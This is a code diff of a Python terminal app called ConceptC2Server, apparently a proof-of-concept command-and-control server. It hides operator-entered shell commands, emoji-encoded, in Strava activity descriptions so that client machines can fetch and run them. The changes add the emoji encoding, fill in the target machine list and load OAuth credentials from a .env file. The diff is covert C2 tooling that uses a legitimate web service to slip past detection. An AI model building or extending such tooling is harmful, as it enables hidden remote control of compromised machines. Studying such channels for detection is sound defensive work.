@@ -1,17 +1,23 @@
-from flask import Flask, request
+import webbrowser
+import os
+from datetime import datetime, timedelta
 from pathlib import Path
+
+import requests
+from dotenv import dotenv_values
+from flask import Flask, request
 from textual import on, work
 from textual.reactive import var
 from textual.app import App, ComposeResult
 from textual.widgets import Footer, Header, Button, Label, Collapsible, Select, Input
-import webbrowser
-import requests
-from datetime import datetime, timedelta
+
+from tools import emoji_encode, emoji_decode
 
 
+config = dotenv_values(Path(__file__).parent/".env") 
 
 URL = "http://www.strava.com/oauth/authorize?client_id=148429&response_type=code&redirect_uri=http://localhost:5000/exchange_token&approval_prompt=force&scope=read,profile:read_all,profile:write,activity:read,activity:write"
-MAIN_ACTIVITY = ""
+MAIN_ACTIVITY = config.get("MAIN_ACTIVITY","")
 CODE = ""
 
 def post_activity(description: str, machine:str, token=""):
@@ -70,7 +76,7 @@ class ConceptC2Server(App):
         with Collapsible(title="Refresh OAuth token",collapsed=False):
             yield Label("You should refresh the OAuth API, for that click the button bellow and confirm access to your Strava account. Once validated, you can close the running Flask server with Ctrl+C", id="refresh-label")
             yield Button("Refresh!", variant="success", id="refresh")
-        yield Select(options=[], prompt="Machine")
+        yield Select(options=[(os.getlogin(), os.getlogin())], prompt="Machine")
         yield Input(placeholder="Enter command to send")
         yield Footer()
 
@@ -78,7 +84,7 @@ class ConceptC2Server(App):
     def post_command(self, event: Input.Submitted):
         client_machine = self.query_one(Select).value
         command = event.input.value
-        response = post_activity(command, client_machine, self.access_token)
+        response = post_activity(emoji_encode("🏃", command), client_machine, self.access_token)
         if response.status_code == 200:
             self.notify("New command to execute added!")
         else:
@@ -92,8 +98,8 @@ class ConceptC2Server(App):
         with open(Path(__file__).parent / "code","r") as f:
             CODE = f.read()
             files = {
-                'client_id': (None, '<client_id>'),
-                'client_secret': (None, '<client_secret>'),
+                'client_id': (None, config.get("CLIENT_ID","")),
+                'client_secret': (None, config.get("CLIENT_SECRET","")),
                 'code': (None, CODE),
                 'grant_type': (None, 'authorization_code'),
             }
